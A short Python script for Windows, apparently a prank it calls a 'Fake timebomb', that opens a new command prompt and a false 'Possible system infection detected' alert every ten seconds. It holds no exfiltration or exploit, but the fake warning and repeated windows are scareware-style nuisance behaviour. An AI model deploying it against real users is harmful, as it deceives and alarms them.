import subprocess
import time
import ctypes

def open_cmd():
    subprocess.Popen("start cmd", shell=True)

def show_alert():
    ctypes.windll.user32.MessageBoxW(
        0,
        "⚠️ Possible system infection detected.\nPlease check your files.",
        "System Alert",
        0x40 | 0x1  # MB_ICONINFORMATION + OK button
    )

try:
    while True:
        open_cmd()
        show_alert()
        time.sleep(10)
except KeyboardInterrupt:
    print("Fake timebomb stopped by user.")
